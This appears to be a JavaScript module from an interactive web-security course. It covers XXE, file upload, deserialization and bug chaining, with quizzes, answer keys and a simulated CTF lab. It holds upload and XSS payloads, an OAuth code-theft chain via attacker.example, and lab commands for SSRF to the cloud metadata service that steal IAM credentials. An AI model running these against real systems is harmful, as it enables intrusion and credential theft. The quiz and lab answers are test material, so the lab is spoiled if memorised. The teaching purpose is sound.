            type: "mc",
            q: "In the worked example, why is seeing text matching /etc/passwd's known structure stronger evidence than just 'the response changed'?",
            options: [
              "Because /etc/passwd is always empty on secure servers",
              "Because /etc/passwd has a specific, recognisable line format that is very unlikely to appear by coincidence, so its appearance is strong, specific proof of file disclosure",
              "Because it proves remote code execution",
              "Because any change in output always indicates XXE",
            ],
            answer: 1,
            why: [
              "/etc/passwd commonly exists and is readable to list system accounts; emptiness isn't the point.",
              "Correct \u2014 recognisable structured content is a much stronger confirmation signal than a generic 'something changed' observation, which could have many innocent causes.",
              "File read and code execution are different impacts; this confirms file disclosure only.",
              "Generic output changes could stem from many unrelated causes (e.g. a normal parsing quirk), which is why a specific, recognisable artefact matters.",
            ],
            explain: "Good validation looks for a specific, hard-to-fake artefact of the expected behaviour, not just 'the output looks different.'",
            hints: ["Think about why testers pick /etc/passwd specifically rather than an arbitrary file for a first probe."],
            ref: "Worked example: confirming and validating an XXE file read",
          },
        },
        {
          title: "File upload: the attack surface order",
          kind: "explain",
          body: [
            "Upload vulnerabilities come from a chain of decisions, each independently exploitable: (1) filename handling \u2014 what characters/extensions are allowed; (2) content handling \u2014 is the actual file content inspected, or only its declared type/extension trusted; (3) where it's served from \u2014 same domain as the app, or an isolated storage domain; (4) who executes it \u2014 does the serving web server treat this file type as a script to run, or as inert data to send as-is.",
            "Concrete chain: you upload shell.php; the server renames it to shell.php.jpg thinking that neutralises it. If it's simply served as a static file, visiting /uploads/shell.php.jpg just downloads an image-named text file \u2014 not RCE, because nothing EXECUTES it. But if the web server's handler config matches '.php' anywhere in the filename (a common misconfiguration, e.g. Apache's AddHandler matching as a substring), requesting that same file causes PHP to execute it \u2014 RCE.",
            "SVG uploads rendered inline can carry embedded <script> or event-handler attributes, making them a pathway to stored XSS even without any server-side execution at all \u2014 a different impact from RCE but still real.",
          ],
          code: `# payloads to try, each testing a different stage of the chain
shell.php
shell.php.jpg       (double extension \u2014 tests handler-matching misconfig)
shell.phtml         (alternate extension some PHP configs still execute)
shell.pHp           (case handling)
"><svg onload=alert(1)>.svg   (XSS via inline SVG rendering, not RCE)
../../../../tmp/x.php          (path traversal in filename, separate from extension bugs)`,
          tone: "offense",
        },
        {
          title: "Insecure deserialization: recognising the formats",
          kind: "explain",
          body: [
            "An app is vulnerable when it deserializes a byte stream that the CLIENT supplied (e.g. in a cookie or hidden parameter) without verifying it's unmodified and trustworthy. Deserializers in several languages don't just rebuild plain data \u2014 they can instantiate arbitrary classes named in the stream and automatically call certain 'magic methods' (like a constructor or destructor) during reconstruction.",
            "If the attacker can name a class whose magic method, when triggered, performs a dangerous action (write a file, run a command), deserializing attacker-controlled bytes can directly lead to RCE. Pre-built tool chains (e.g. ysoserial for Java) chain together several ordinary, otherwise-harmless classes ('gadgets') already present in the app's dependencies to build one of these dangerous call paths \u2014 you don't need the app to contain intentionally malicious code, only ordinary library code assembled in an exploitable order.",
            "Spotting candidates: look for base64-looking blobs in cookies/parameters, then decode them and check for a recognisable serialization header: `rO0AB...` (Java), `O:8:\"...` (PHP), bytes starting `\\x80\\x04` (Python pickle protocol 4).",
          ],
          tone: "offense",
          check: {
            type: "match",
            q: "Match the magic prefix/marker to the serialization format it indicates.",
            pairs: [
              ["rO0AB", "Java serialized object"],
              ["O:8:", "PHP serialized object"],
              ["\\x80\\x04", "Python pickle"],
            ],
            explain: "If you see rO0AB in a cookie, your heart should skip. Java deserialization is often an instant RCE via a known gadget chain.",
            hints: ["Java's format is base64-prefixed with its serialization magic bytes.", "PHP's format writes type and length counts before values, e.g. O:8:."],
            ref: "Insecure deserialization: recognising the formats",
          },
        },
        {
          title: "Common mistakes",
          kind: "mistakes",
          body: [
            "Mistake: assuming any accepted upload extension equals RCE. shell.php.jpg being accepted and stored proves a WEAK filename check, not RCE \u2014 you must also show the file is actually executed when requested (step 4 of the attack-surface order), otherwise it's just an unrestricted-upload finding, a lower severity.",
            "Mistake: concluding 'no XXE' from a single blank response. Many XXE cases are blind \u2014 absence of visible output does not mean the entity wasn't processed; try the OOB/parameter-entity technique before ruling it out.",
            "Mistake: treating 'found a base64 blob that decodes to O:8:...' as confirmed RCE. It confirms the APP USES PHP serialization for that value \u2014 actual RCE additionally requires a usable gadget chain present in the app's loaded classes, which must be separately demonstrated (usually with a tool like a PHP-equivalent of ysoserial).",
          ],
        },
        {
          title: "Guided practice",
          kind: "practice",
          body: [
            "An upload form accepts avatar.php.png, storing and serving it from the same domain as the main app, at /avatars/avatar.php.png. The web server config includes `AddHandler php-script .php`. Walk through: (1) does this config match a filename ending in .php.png? (2) what would requesting that file actually do? (3) what single piece of evidence would you need to capture to prove RCE rather than just 'unrestricted upload'?",
          ],
          check: {
            type: "mc",
            q: "Upload accepts `shell.php.jpg`, saves it unchanged, and Apache config has `AddHandler php-script .php`. What happens when the file is requested?",
            options: [
              "Nothing, it's served as a harmless JPG",
              "Apache's substring-style handler match can trigger PHP execution for any filename containing .php, even mid-filename \u2014 RCE",
              "The server automatically deletes it",
              "The browser, not the server, executes the PHP",
            ],
            answer: 1,
            why: [
              "This assumes the handler only matches a trailing '.jpg', ignoring the substring-matching misconfiguration described in the lesson.",
              "Correct \u2014 this is the classic AddHandler substring-matching misconfiguration turning an accepted 'image' upload into server-side code execution.",
              "Nothing in this scenario describes automatic deletion.",
              "PHP is always executed server-side, never by the browser.",
            ],
            explain: "AddHandler can match the extension as a substring anywhere in the filename on misconfigured Apache setups \u2014 a classic chain turning upload into RCE.",
            hints: ["Recall the 'File upload: the attack surface order' card's AddHandler example.", "The key question is whether the file gets EXECUTED, not just stored."],
            ref: "File upload: the attack surface order",
          },
        },
        {
          title: "Practical relevance: proving the chain, staying in scope",
          kind: "relevance",
          body: [
            "These three bug classes (XXE, upload, deserialization) matter because each can independently reach high-severity impact (file disclosure, RCE), and all three are commonly found behind innocuous-looking features (document import, avatar upload, 'remember me' cookies).",
            "For each, the confirmed vulnerability and the maximum claimed impact are different statements: XXE confirms file read OR SSRF depending on payload \u2014 don't claim both without testing both; unrestricted upload confirms weak validation \u2014 RCE additionally requires proving execution; a recognisable serialization blob confirms deserialization is happening \u2014 RCE additionally requires a working gadget chain.",
            "Only attempt file reads, uploads, or deserialization payloads against systems in your authorised scope, and prefer safe proof-of-concept actions (reading a known non-sensitive file, running `id`/`whoami`) over destructive ones.",
          ],
        },
      ],
      exercises: [
        {
          type: "match",
          q: "Match the magic prefix to the format.",
          pairs: [
            ["rO0AB", "Java serialized object"],
            ["O:8:", "PHP serialized object"],
            ["\\x80\\x04", "Python pickle"],
            ["eyJ", "JWT / base64 JSON"],
          ],
          explain: "If you see rO0AB in a cookie, your heart should skip. Java deser is often an instant RCE.",
          hints: ["Recall the formats covered in 'Insecure deserialization: recognising the formats'."],
          ref: "Insecure deserialization: recognising the formats",
        },
        {
          type: "mc",
          q: "Upload accepts `shell.php.jpg`, saves it as `shell.php.jpg`, Apache has `AddHandler php-script .php`. What happens on request?",
          options: [
            "Nothing, it's a JPG",
            "Apache's handler can be triggered by any filename containing .php \u2014 RCE",
            "The server deletes it",
            "The browser renders it",
          ],
          answer: 1,
          why: [
            "Incorrect \u2014 the handler matches the extension as a substring, not only a trailing match of the full filename.",
            "Correct \u2014 AddHandler matches the extension as a substring. Classic misconfig turning upload into RCE.",
            "No deletion behaviour is implied by this configuration.",
            "PHP executes server-side; the browser plays no role in execution.",
          ],
          explain: "AddHandler matches the extension as a substring. Classic misconfig turning upload into RCE.",
          hints: ["Review 'File upload: the attack surface order'."],
          ref: "File upload: the attack surface order",
        },
        {
          type: "mc",
          q: "An XML import feature echoes back the file contents it parsed, including &xxe; references. You submit a file-read XXE payload and see nothing different in the response. What is the most reasonable next step?",
          options: [
            "Conclude XXE is impossible here",
            "Try the blind/OOB technique (parameter entity fetching an attacker-hosted DTD) before ruling it out",
            "Immediately report confirmed RCE",
            "Switch the content-type header to text/plain and stop testing",
          ],
          answer: 1,
          why: [
            "A blank response in-band doesn't rule out blind XXE, which needs an out-of-band confirmation technique instead.",
            "Correct \u2014 this follows the lesson's guidance: don't conclude 'no XXE' from one blank response; try the OOB/parameter-entity approach.",
            "Nothing here demonstrates code execution; XXE at most confirms file read or SSRF.",
            "Changing the content-type doesn't address the actual blind-XXE testing gap.",
          ],
          explain: "This reflects the 'Common mistakes' point: a single blank response doesn't rule out XXE; the blind/OOB technique is needed before concluding there's no vulnerability.",
          hints: ["Review the 'Common mistakes' card's point about blank XXE responses."],
          ref: "Common mistakes",
        },
        {
          type: "mc",
          q: "You find a cookie value that base64-decodes to bytes starting with `rO0AB`. What is the most ACCURATE immediate conclusion?",
          options: [
            "RCE is confirmed",
            "The app is using Java serialization for this value \u2014 RCE is plausible but requires a working gadget chain to confirm",
            "The app is using PHP serialization",
            "This is just a JWT",
          ],
          answer: 1,
          why: [
            "Recognising the format is only step one; a working gadget chain must still be demonstrated for RCE.",
            "Correct \u2014 rO0AB indicates Java serialization; actual RCE needs a separate, demonstrated gadget chain.",
            "PHP's marker is O:8:..., not rO0AB.",
            "JWTs are base64url JSON and typically start with eyJ, not rO0AB.",
          ],
          explain: "Recognising the serialization format is the first step; claiming RCE additionally requires demonstrating a usable gadget chain, as covered in 'Common mistakes'.",
          hints: ["Match the prefix to its format first, then ask what's still missing for RCE."],
          ref: "Common mistakes",
        },
      ],
    },
    {
      id: "chains",
      title: "Chaining bugs",
      summary: "Low-severity + low-severity = critical.",
      cards: [
        {
          title: "Objective",
          kind: "objective",
          body: [
            "By the end of this lesson you can: explain why individually low-severity findings can combine into a critical one, trace a realistic multi-step chain from initial finding to final impact, and correctly separate what each step in a chain actually proves from what the combined chain proves.",
          ],
        },
        {
          title: "Normal operation: why severity is assessed per finding first",
          kind: "intuition",
          body: [
            "Normally, each vulnerability is rated on its own worst-case impact assuming nothing else goes wrong around it \u2014 an open redirect alone is low severity because, by itself, it just sends a browser to an unexpected page.",
            "Analogy: a single unlocked side door to a building is a minor issue if the building has nothing valuable near that door. But if that door also happens to be ten steps from the vault, and the vault's combination lock has a predictable default code, the SAME unlocked door is now part of a critical path. Chaining is about recognising when several individually-minor weaknesses sit next to each other on the same path.",
          ],
          tone: "info",
        },
        {
          title: "Prerequisites: recognise each link from earlier lessons",
          kind: "prereq",
          body: [
            "This lesson assumes you already know, individually: SSRF and IMDS credential theft (this unit's SSRF lesson), open redirects and OAuth/SAML redirect-target trust (unit 6), and stored XSS (earlier unit). Chaining doesn't teach new mechanisms \u2014 it teaches how to notice when outputs from one finding become inputs to the next.",
            "A 'chain' in this context means: the OUTPUT (what you gain) from exploiting finding A becomes a necessary INPUT (what you need) for exploiting finding B, and so on, until the final step produces an impact none of the individual findings could reach alone.",
          ],
        },
        {
          title: "The pattern: output of one bug becomes input to the next",
          kind: "explain",
          body: [
            "Common chains: open redirect + OAuth misconfiguration \u2192 account takeover (the redirect carries a stolen auth code to the attacker because the OAuth provider only validated the host, not the full path, of the redirect target); CRLF injection \u2192 cache poisoning \u2192 stored XSS \u2192 mass session theft (each step turns the previous step's output into a bigger blast radius); SSRF \u2192 IMDS \u2192 cloud credentials \u2192 S3 bucket write \u2192 supply-chain compromise (this unit's SSRF lesson up to credential theft, then escalated further); subdomain takeover \u2192 cookie Domain=.example.com \u2192 session read on the main app (control of an abandoned subdomain lets you read cookies scoped to the whole parent domain).",
            "The report-worthy insight in each case is explaining WHY step N's output satisfies step N+1's prerequisite \u2014 not just listing bug names next to each other.",
          ],
          tone: "offense",
          code: `example chain: 'the SaaS takeover'

1. recon finds api.old.target.example  \u2192  200, Rails 5
2. app has 'export URL' feature \u2192 SSRF against 169.254.169.254
3. IMDS returns IAM creds with s3:*
4. attacker writes a modified JS bundle into shared assets bucket
5. main app loads bundle on next deploy \u2192 stored XSS for every user
6. combined report: critical, worth a full tier bounty.`,
          check: {
            type: "order",
            q: "Order the 'SaaS takeover' chain from first action to final impact.",
            items: [
              "Recon finds an old subdomain running an outdated framework",
              "An 'export URL' feature on that subdomain is abused for SSRF against the metadata service",
              "Stolen IAM credentials grant S3 write access to a shared assets bucket",
              "A modified JS bundle is written to that bucket and loaded by the main app on next deploy",
              "Every user of the main app now executes the attacker's injected script (stored XSS impact)",
            ],
            explain: "Each step's output (an entry point, then credentials, then write access, then a loaded malicious asset) becomes the next step's required input.",
            hints: ["Start from reconnaissance, end at impact on end users.", "Credentials must be obtained before they can be used to write to storage."],
            ref: "The pattern: output of one bug becomes input to the next",
          },
        },
        {
          title: "Worked example: validating each link, not just the final impact",
          kind: "example",
          body: [
            "Scenario: you find an open redirect at /logout?next=<url> on shop.example, which uses OAuth login.",
            "Step 1 \u2014 confirm the redirect works stand-alone: visiting /logout?next=https://attacker.example sends your browser to attacker.example. This alone is low severity (an annoyance, maybe phishing-adjacent) \u2014 you note it as such for now.",
            "Step 2 \u2014 check the OAuth provider's redirect validation: inspect the OAuth authorization request and see the redirect_uri parameter is validated only by checking the HOST matches shop.example, not the full path. This means shop.example/logout?next=https://attacker.example is itself accepted as a 'valid' redirect_uri, because its host is shop.example.",
            "Step 3 \u2014 chain them: set redirect_uri to the vulnerable logout path with next pointing at your server. After the victim completes login, the OAuth provider's callback (carrying a sensitive authorization code) lands on the legitimate shop.example page, which THEN immediately redirects on to attacker.example \u2014 forwarding the authorization code to you.",
            "Step 4 \u2014 confirm impact precisely: show that the leaked code can be exchanged for an access token, logging the attacker in as the victim \u2014 this is the account-takeover impact, and it required BOTH bugs; neither alone caused it. Document step 1 and step 2 as supporting findings and step 3\u20134 as the demonstrated combined impact.",
          ],
          check: {
            type: "mc",
            q: "In the worked chain example, why isn't the open redirect alone rated as account takeover?",
            options: [
              "Because open redirects are never real vulnerabilities",
              "Because, by itself, the redirect only sends a browser to another page \u2014 it only becomes account takeover once combined with the OAuth provider's weak host-only redirect_uri validation",
              "Because OAuth is unrelated to redirects",
              "Because the redirect only works for admins",
            ],
            answer: 1,
            why: [
              "Open redirects are real, documented, if typically low-severity findings.",
              "Correct \u2014 the redirect's low standalone impact only becomes critical when it satisfies the OAuth flow's unmet security assumption (that redirect_uri fully trustworthy).",
              "The OAuth provider's own redirect_uri validation logic is exactly what makes this chain possible.",
              "Nothing in the scenario restricts this to admin accounts.",
            ],
            explain: "This is the core chaining lesson: rate each link on its own first, then explain precisely which additional condition promotes it to a higher combined severity.",
            hints: ["What does the redirect alone accomplish, with no OAuth flow involved at all?"],
            ref: "Worked example: validating each link, not just the final impact",
          },
        },
        {
          title: "Common mistakes",
          kind: "mistakes",
          body: [
            "Mistake: reporting 'open redirect' and 'OAuth redirect_uri host-only validation' as two unrelated low-severity findings when they actually combine into account takeover \u2014 under-reporting severity by not recognising the chain.",
            "Mistake: the opposite error \u2014 claiming the combined critical severity without having actually demonstrated step 3\u20134 (stealing and using a real authorization code). Describing a THEORETICAL chain is not the same as a DEMONSTRATED chain; reports should clearly state which parts were proven end-to-end versus reasoned about.",
            "Mistake: assuming any two findings can be chained just because both exist on the same app. A valid chain requires that one step's actual OUTPUT satisfies the next step's actual INPUT requirement \u2014 not just thematic similarity.",
          ],
        },
        {
          title: "Guided practice",
          kind: "practice",
          body: [
            "You find: (a) a subdomain old.shop.example that returns NXDOMAIN-style 'no such app' on a third-party hosting platform (a sign it's unclaimed and takeover-able), and (b) the main app sets its session cookie with `Domain=.shop.example` (covering all subdomains). Explain, step by step, what you would need to do to turn these two low/medium findings into a demonstrated session-theft chain, and what single piece of evidence proves the chain (not just the two findings individually).",
          ],
          check: {
            type: "mc",
            q: "You find an open redirect on /logout?next=... Low severity on its own. What is the classic chain partner that elevates it?",
            options: ["XSS", "OAuth / SAML flow that validates redirect_uri by host only, trusting `next` as the post-login redirect", "SSRF", "CSRF"],
            answer: 1,
            why: [
              "XSS is a different bug class and isn't the classic redirect-elevation chain described in this lesson.",
              "Correct \u2014 open redirect + OAuth that whitelists just the host lets an attacker steal the auth code after login, enabling account takeover.",
              "SSRF doesn't interact with a client-side redirect parameter like this.",
              "CSRF is unrelated to a redirect_uri validation weakness.",
            ],
            explain: "Open redirect + OAuth that whitelists just the host \u2192 attacker steals the auth code after login \u2192 account takeover. Low+Low=Critical.",
            hints: ["Recall the worked example's exact chain partner for the open redirect."],
            ref: "Worked example: validating each link, not just the final impact",
          },
        },
        {
          title: "Practical relevance: reporting chains responsibly",
          kind: "relevance",
          body: [
            "Chaining matters commercially and technically: bug bounty programs and clients reward the DEMONSTRATED combined impact, and defenders need to know the full path, not just isolated weak points, to fix the right link.",
            "A chain report should state, for each link: what was independently confirmed, what evidence supports it, and which link is the 'weakest' one that, if fixed alone, would break the whole chain (useful remediation guidance) \u2014 a chain does not prove every individual link is independently critical.",
            "Never execute the final step of a chain (e.g. actually taking over a real victim account, writing to a production bucket) outside a controlled lab or without explicit authorisation for that exact action; prefer demonstrating up to the point of 'I obtained X, which would allow Y' with a safe stop before causing real impact, unless the engagement rules explicitly permit full exploitation.",
          ],
        },
      ],
      exercises: [
        {
          type: "mc",
          q: "You find an open redirect on /logout?next=... Low severity on its own. What is the classic chain partner?",
          options: ["XSS", "OAuth / SAML misconfig that uses `next` as the post-login redirect", "SSRF", "CSRF"],
          answer: 1,
          why: [
            "Not the classic pairing described in this lesson for redirect-based chains.",
            "Correct \u2014 open redirect + OAuth that whitelists just the host \u2192 attacker steals the auth code after login \u2192 account takeover. Low+Low=Critical.",
            "Unrelated mechanism to a client-side redirect parameter.",
            "Unrelated to redirect_uri validation weaknesses.",
          ],
          explain: "Open redirect + OAuth that whitelists just the host \u2192 attacker steals the auth code after login \u2192 account takeover. Low+Low=Critical.",
          hints: ["Recall the worked OAuth example in this lesson."],
          ref: "Worked example: validating each link, not just the final impact",
        },
        {
          type: "order",
          q: "Order the SSRF-to-supply-chain compromise from the 'SaaS takeover' example.",
          items: [
            "Recon finds an outdated subdomain exposing an 'export URL' feature",
            "SSRF against that feature reaches the cloud metadata service",
            "IMDS leaks IAM credentials with S3 write permission",
            "A malicious JS bundle is written to the shared assets bucket",
            "The main app loads the malicious bundle, causing stored XSS for every user",
          ],
          explain: "Each step's output becomes the following step's needed input, ending in an impact none of the individual steps achieve alone.",
          hints: ["Credentials are needed before anything can be written to storage.", "The malicious bundle must be written before it can be loaded."],
          ref: "The pattern: output of one bug becomes input to the next",
        },
        {
          type: "mc",
          q: "A report lists 'open redirect' and 'OAuth validates redirect_uri by host only' as two separate LOW severity findings on the same app. What is the most accurate critique?",
          options: [
            "The severities are correct as listed",
            "These two findings likely chain into account takeover and should be reported together with the combined, higher severity demonstrated",
            "Neither finding is real",
            "Only the OAuth finding is real; the redirect isn't a bug",
          ],
          answer: 1,
          why: [
            "Reporting them separately under-states the real, combined risk, which is the exact mistake called out in this lesson.",
            "Correct \u2014 recognising the chain and demonstrating the combined impact is the responsible way to report this, per 'Common mistakes'.",
            "Both findings can be real individually; the issue is failing to recognise their combination.",
            "The redirect is a real, if lower-severity, finding on its own.",
          ],
          explain: "This is precisely the under-reporting mistake described in the lesson: treating linked findings as unrelated when their outputs/inputs actually connect.",
          hints: ["Review 'Common mistakes' for the under-reporting example."],
          ref: "Common mistakes",
        },
        {
          type: "mc",
          q: "A tester writes 'this open redirect COULD theoretically chain with OAuth to cause account takeover' but never actually captured a stolen authorization code. What's the accurate way to describe this in a report?",
          options: [
            "Report it as a confirmed, demonstrated critical account-takeover chain",
            "Report it as a reasoned, plausible chain that has NOT been demonstrated end-to-end, clearly distinguishing it from a proven exploit",
            "Don't report it at all since it wasn't demonstrated",
            "Report only the OAuth finding and omit the redirect entirely",
          ],
          answer: 1,
          why: [
            "Overclaiming a theoretical chain as 'demonstrated' is the exact overclaiming mistake the lesson warns against.",
            "Correct \u2014 reports should clearly separate what was proven end-to-end from what was reasoned about but not executed.",
            "A plausible, well-reasoned chain is still valuable information for the client, even if not fully demonstrated \u2014 it should be reported with the appropriate caveat.",
            "Omitting the redirect loses important context that explains the realistic risk of the OAuth weakness.",
          ],
          explain: "Reports must distinguish demonstrated chains from theoretical ones, exactly as covered under 'Common mistakes'.",
          hints: ["Review 'Common mistakes' for the overclaiming-a-theoretical-chain example."],
          ref: "Common mistakes",
        },
      ],
    },
  ],
  lab: {
    id: "lab-advanced-web",
    title: "CTF: metadata heist",
    tone: "offense",
    briefing: [
      "Target: https://shop.example — an image-import feature.",
      "Chain SSRF → IMDS → S3 to find the flag.",
      "Flag format: FLAG{...}",
    ],
    terminal: {
      host: "hunter@kali",
      commands: {
        "curl -i 'https://shop.example/import?url=https://picsum.photos/200'":
          "HTTP/1.1 200 OK\n<img imported from https://picsum.photos/200 size=4321>",
        "curl -i 'https://shop.example/import?url=http://127.0.0.1:9200/_cat/indices'":
          "HTTP/1.1 400 Bad Request\n{\"error\":\"blocked host: localhost/127.0.0.1\"}",
        "curl -i 'https://shop.example/import?url=http://2130706433/_cat/indices'":
          "HTTP/1.1 200 OK\ngreen open shop-items 5 1 10000\ngreen open shop-users 5 1 10000\n(hint: decimal-encoded 127.0.0.1 bypassed the blocklist)",
        "curl -i 'https://shop.example/import?url=http://169.254.169.254/latest/meta-data/'":
          "HTTP/1.1 200 OK\nami-id\nhostname\niam/\nsecurity-credentials/\n...",
        "curl -i 'https://shop.example/import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'":
          "HTTP/1.1 200 OK\nshop-import-role",
        "curl -i 'https://shop.example/import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-import-role'":
          "HTTP/1.1 200 OK\n{\n  \"AccessKeyId\": \"AKIAIMPORTEXAMPLE1\",\n  \"SecretAccessKey\": \"wJalr...FAKE\",\n  \"Token\": \"IQoJb3JpZ2luX2VjE...\",\n  \"Expiration\": \"2026-10-08T04:00:00Z\"\n}",
        "aws s3 ls":
          "2026-01-02 00:00:00 shop-assets\n2026-01-02 00:00:00 shop-user-uploads\n2026-01-02 00:00:00 shop-internal-flags",
        "aws s3 ls s3://shop-internal-flags":
          "2026-10-01 00:00:00    42 ctf.txt",
        "aws s3 cp s3://shop-internal-flags/ctf.txt -":
          "FLAG{ssrf_imds_s3_the_classic_cloud_chain}",
        "curl -i 'https://shop.example/import?url=http://localhost:9200/'":
          "HTTP/1.1 400 Bad Request\n{\"error\":\"blocked host\"}",
      },
      hints: [
        "curl -i 'https://shop.example/import?url=http://127.0.0.1:9200/_cat/indices'",
        "curl -i 'https://shop.example/import?url=http://2130706433/_cat/indices'",
        "curl -i 'https://shop.example/import?url=http://169.254.169.254/latest/meta-data/'",
        "curl -i 'https://shop.example/import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
        "curl -i 'https://shop.example/import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-import-role'",
        "aws s3 ls",
        "aws s3 cp s3://shop-internal-flags/ctf.txt -",
      ],
    },
    tasks: [
      {
        q: "Which encoding of 127.0.0.1 bypasses the host blocklist?",
        answers: ["2130706433", "decimal", "decimal encoding"],
        hint: "32-bit integer representation of 127.0.0.1.",
      },
      {
        q: "What is the name of the IAM role attached to the instance?",
        answers: ["shop-import-role"],
        hint: "The IMDS iam/security-credentials/ endpoint lists it.",
      },
      {
        q: "Which S3 bucket contains the flag?",
        answers: ["shop-internal-flags", "s3://shop-internal-flags"],
        hint: "`aws s3 ls` after exporting the credentials.",
      },
      {
        q: "What is the flag?",
        answers: ["FLAG{ssrf_imds_s3_the_classic_cloud_chain}", "ssrf_imds_s3_the_classic_cloud_chain"],
        hint: "`aws s3 cp s3://shop-internal-flags/ctf.txt -`.",
      },
    ],
  },
  ids: {
    name: "Advanced web kit",
    description:
      "You can find SSRF, SSTI, XXE, dangerous uploads and insecure deserialization — the bug classes that chain into cloud takeover.",
    rules: [],
  },
};

export default unit7;
